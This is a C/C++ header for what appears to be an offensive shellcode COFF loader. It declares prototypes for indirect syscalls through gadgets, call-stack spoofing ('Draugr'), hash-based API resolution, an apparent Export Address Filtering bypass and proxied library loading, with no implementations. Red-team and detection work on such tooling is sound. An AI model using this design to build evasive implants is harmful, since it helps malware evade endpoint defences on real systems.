#pragma once

#include <windows.h> 

#include "CoffUtils.h"
#include "Instance.h"

typedef enum _LOADLIB_METHOD {
    THREAD_POOL,
    PROXY_TIMER,
    NONE
} LOADLIB_METHOD;

extern "C" UINT_PTR __INSTANCE;

/*  ===================================================
        Prototypes
=================================================== */

typedef PRUNTIME_FUNCTION (WINAPI* _RtlLookupFunctionEntry)(DWORD64, PDWORD64, PUNWIND_HISTORY_TABLE);
typedef void (WINAPI* pfnEntryPoint)(void* Args);


/*  ===================================================
        Asm functions
=================================================== */

extern "C" UINT_PTR         GetShellcodeStart();
extern "C" UINT_PTR         GetShellcodeEnd();
extern "C" bool             PreMain();
extern "C" VOID CALLBACK    WorkCallback(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
extern "C" NTSTATUS         CoffDoSyscall(...);
extern "C" UINT_PTR         SpoofStub(...);

extern "C" VOID CoffPrepareSyscall(
    _In_    PVOID   pGadget,
    _In_    DWORD   dwSyscall
);

extern "C" PVOID ReadMemFromGadget(
	_In_	PVOID	pAddressToRead,
	_In_	PVOID	pGadget
);

/*  ===================================================
        Utils.cc
=================================================== */

DWORD	StrLenA(
	_In_	LPSTR	Str
);

VOID	_memset(
	_In_	PVOID	pAddress,
	_In_	BYTE	Value,
	_In_	SIZE_T	Size
);

VOID	_memcpy(
	_In_	PVOID	pDstBuffer,
	_In_	PVOID	pSrcBuffer,
	_In_	SIZE_T	sBufferSize
);

bool	_strcmp(
	_In_	LPSTR	lpStrA,
	_In_	LPSTR	lpStrB
);

bool	_memcmp(
	_In_	PVOID	lpBufferA,
	_In_	PVOID	lpBufferB,
	_In_	DWORD	dwCheckSize
);

LPSTR	_strtok_s(
	_Inout_opt_	LPSTR	lpStr,
	_In_		LPSTR	lpDelimiters,
	_Inout_		LPSTR*	lpContext
);

/*  ===================================================
        CoffLoader.cc
=================================================== */


bool    InitializeCoffContext
(
    _Inout_ PCOFF_LOADER_CONTEXT    pCoffContext,
    _In_    PVOID                   pCoffContent,
    _In_    DWORD                   dwCoffSize
);

bool    AllocateMemorySection
(
    _In_    PCOFF_LOADER_CONTEXT    pCoffContext
);

bool LoadAndResolveSymbols(
	_Inout_ PCOFF_LOADER_CONTEXT pCoffContext
);

bool ApplyRelocations(
	_Inout_ PCOFF_LOADER_CONTEXT pCoffContext
);

bool	ApplyMemoryProtection(
	_In_	PCOFF_LOADER_CONTEXT	pCoffContext
);

bool ExecuteEntryPoint(
	_In_    PCOFF_LOADER_CONTEXT    pCoffContext,
    _In_    PVOID                   pCoffArgs
);

VOID FreeCoffContext(
	_Inout_ PCOFF_LOADER_CONTEXT    pCoffContext
);

/*  ===================================================
        CoffHelpers.cc
=================================================== */
HMODULE CoffLoadLibraryA(
    _In_    LOADLIB_METHOD  Method,
    _In_    LPSTR  lpModuleName
);

bool    CoffResolveSyscall(
    _In_    LPSTR  lpFunctionName,
    _Inout_ PVOID   *pGadget,
    _Inout_ PDWORD  dwSyscallNumber
);

UINT_PTR	CoffSpoofCall(
	_In_	PVOID		pFunction,
	_In_	DWORD		dwSyscall,
	_In_	PVOID	Rcx,
	_In_	PVOID	Rdx,
	_In_	PVOID	R8,
	_In_	PVOID	R9,
	_In_	PVOID	StackArg1,
	_In_	PVOID	StackArg2,
	_In_	PVOID	StackArg3,
	_In_	PVOID	StackArg4,
	_In_	PVOID	StackArg5,
	_In_	PVOID	StackArg6,
	_In_	PVOID	StackArg7,
	_In_	PVOID	StackArg8
);

PVOID	CoffAlloc(
	_In_	SIZE_T	stSize
);

PVOID	CoffFree(
	_In_	PVOID	pAddress
);

/*  ===================================================
        Draugr.cc
=================================================== */
UINT_PTR	DraugrCall(
	_In_	PINSTANCE	Inst,
	_In_	PVOID		pFunction,
	_In_	DWORD		dwSyscall,
	_In_	PVOID	Rcx,
	_In_	PVOID	Rdx,
	_In_	PVOID	R8,
	_In_	PVOID	R9,
	_In_	PVOID	StackArg1,
	_In_	PVOID	StackArg2,
	_In_	PVOID	StackArg3,
	_In_	PVOID	StackArg4,
	_In_	PVOID	StackArg5,
	_In_	PVOID	StackArg6,
	_In_	PVOID	StackArg7,
	_In_	PVOID	StackArg8
);

/*  ===================================================
        LdrApi.cc
=================================================== */
PVOID ResolveModuleAddressWithHash(
    _In_    DWORD   dwModuleHash
);

PVOID	ResolveEafGadgetAddress(
	_In_	PVOID	pModule
);

PVOID ResolveProcedureAddressWithHash(
	_In_	PVOID	pGadgetRead,
    _In_    PVOID   pModuleAddr, 
    _In_    DWORD   dwProcHash
);

DWORD HashStringA(
    _In_    LPSTR   str
);

DWORD HashStringW(
    _In_    LPWSTR  str
);

PVOID ResolveJmpRbxGadget(
	_In_	PVOID	    pModuleAddr
);

bool CalculateFunctionStackSizeWrapper(
    _In_    _RtlLookupFunctionEntry fnRtlLookupFunctionEntry,
	_In_    PVOID   	            pFunction,
	_Inout_ PDWORD  	            pdwStackSize
);



/*  ===================================================
        Main.cc
=================================================== */

bool ShellcodeEntry(
    _In_    PVOID       pCoffContent,
    _In_    DWORD       dwCoffSize
);